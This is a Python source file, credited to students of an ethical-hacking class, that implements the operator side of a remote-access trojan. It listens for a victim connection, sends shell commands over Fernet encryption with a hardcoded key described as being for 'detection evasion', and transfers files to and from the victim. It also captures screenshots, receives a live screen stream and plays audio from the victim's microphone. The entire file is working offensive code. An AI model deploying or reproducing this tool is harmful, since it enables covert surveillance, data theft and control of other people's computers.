################################################
# Authors: Korn D., Krittanut Y.,              #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# Import necessary libraries
import base64
import datetime  # For timestamping
import socket  # This library is used for creating socket connections.
import json  # JSON is used for encoding and decoding data in a structured format.
import os  # This library allows interaction with the operating system.
import ctypes
from ctypes import c_char_p, c_int, CFUNCTYPE
import pyaudio
import threading
from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
import cv2 # (OpenCV) shows the image in a live window.
import numpy as np # helps decode the raw JPEG bytes into an image array.
import threading


# Pre-shared key for encryption
psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption


# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data *added*
    data_len = len(encrypted_data)
    target.sendall(data_len.to_bytes(4, 'big'))  # Send 4-byte length prefix
    target.sendall(encrypted_data)



# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data_len_bytes = target.recv(4)
    if not data_len_bytes:
        return None
    data_len = int.from_bytes(data_len_bytes, 'big')
    data = b''
    while len(data) < data_len:
        packet = target.recv(data_len - len(data))
        if not packet:
            return None
        data += packet
    decrypted_data = cipher.decrypt(data)
    return json.loads(decrypted_data.decode())


# Function to upload a file to the target machine
def upload_file(file_name):
    # Open the specified file in binary read ('rb') mode.
    f = open(file_name, 'rb')
    # Read the contents of the file and send them over the network connection to the target.
    target.send(f.read())


# Function to download a file from the target machine
def download_file(file_name):
    # Open the specified file in binary write ('wb') mode.
    f = open(file_name, 'wb')
    # Set a timeout for receiving data from the target (1 second).
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        # Write the received data (chunk) to the local file.
        f.write(chunk)
        try:
            # Attempt to receive another chunk of data from the target.
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    # Reset the timeout to its default value (None).
    target.settimeout(None)
    # Close the local file after downloading is complete.
    f.close()

# Listens for incoming image data from the victim.
def receive_screen_stream():
    stream_sock = socket.socket() # Create a TCP socket
    stream_sock.bind(('0.0.0.0', 9999)) # Bind it to port 9999, accept the victim’s stream connection
    stream_sock.listen(1)
    conn, addr = stream_sock.accept()
    print(f"[+] Live screen stream from {addr}")

    try:
        while True: # Start reading frames in a loop.
            size_data = conn.recv(4) # Read the 4-byte size prefix.
            if not size_data:
                break
            size = int.from_bytes(size_data, 'big') # Convert it back into an integer (JPEG image length).
            data = b''
            while len(data) < size: # Read the full image payload based on the size prefix.
                packet = conn.recv(size - len(data))
                if not packet:
                    break
                data += packet # Append until the complete image is received.

            img_array = np.frombuffer(data, dtype=np.uint8) # Convert raw JPEG bytes into a numpy array
            frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR) # Decode into a color image (OpenCV format)
            if frame is not None:
                resized = cv2.resize(frame, (1280, 720))  # Change size of window
                cv2.imshow("Live Screen", resized) # Display the image in a window named Live Screen
                if cv2.waitKey(1) == ord('q'): # If the user presses q, stop the stream
                    break
    finally:
        conn.close()
        cv2.destroyAllWindows()


ERROR_HANDLER_FUNC = CFUNCTYPE(None, c_char_p, c_int, c_char_p, c_int, c_char_p)

def py_error_handler(filename, line, function, err, fmt):
    pass  # suppress all ALSA errors

c_error_handler = ERROR_HANDLER_FUNC(py_error_handler)

try:
    asound = ctypes.cdll.LoadLibrary('libasound.so')
    asound.snd_lib_error_set_handler(c_error_handler)
except OSError:
    pass  # libasound not found, skip suppression

def stream_audio_from_target(flag):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 11025

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS,
                    rate=RATE, output=True, frames_per_buffer=CHUNK)

    try:
        while flag['on']:
            data = target.recv(CHUNK)
            if not data:
                break
            stream.write(data)
    except:
        pass
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()


# Function for the main communication loop with the target
def target_communication():
    while True:
        # Prompt the user for a command to send to the target.
        command = input('* Shell~%s: ' % str(ip))
        # Send the user's command to the target using the reliable_send function.
        reliable_send(command)
        if command == 'quit':
            # If the user enters 'quit', exit the loop and close the connection.
            break
        elif command == 'clear':
            # If the user enters 'clear', clear the terminal screen.
            os.system('clear')
        elif command[:3] == 'cd ':
            # If the user enters 'cd', change the current directory on the target (not implemented).
            pass
        elif command[:8] == 'download':
            # If the user enters 'download', initiate the download of a file from the target.
            download_file(command[9:])
        elif command[:6] == 'upload':
            # If the user enters 'upload', initiate the upload of a file to the target.
            upload_file(command[7:])
        elif command == 'listening_start':
            stream_flag = {'on': False}
            if not stream_flag['on']:
                stream_flag['on'] = True
                audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag,))
                audio_thread.start()
            result = reliable_recv()
            print(result)
        elif command == 'listening_stop':
            stream_flag['on'] = False
            audio_thread.join()  # Wait for the audio thread to finish
            print("[+] Audio stream stopped.")
        elif command == 'screenshot':
            # If the user enters 'screenshot', send a command to take a screenshot on the target.
            shot = reliable_recv()
            image_data = base64.b64decode(shot)
            if image_data:
                # Format timestamp
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                filename = f'screenshot_{timestamp}.png' # filename format
                with open(filename, 'wb') as f:
                    f.write(image_data)
                # If the screenshot command is successful, print the result.
                print('[+] Screenshot taken successfully.')
            else:
                # If the screenshot command fails, print an error message.
                print('[-] Failed to take screenshot.')
        elif command == 'screen_stream':
            threading.Thread(target=receive_screen_stream, daemon=True).start()
            print('[*] Waiting for live stream...')  # target will send after this
            result = reliable_recv()
            print(result)
        else:
            # For other commands, receive and print the result from the target.
            result = reliable_recv()
            print(result)


# Create a socket for the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
sock.bind(('192.168.210.1', 5555))

# Start listening for incoming connections (maximum 5 concurrent connections).
print('[+] Listening For The Incoming Connections')
sock.listen(5)

# Accept incoming connection from the target and obtain the target's IP address.
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))

# Start the main communication loop with the target by calling target_communication.
target_communication()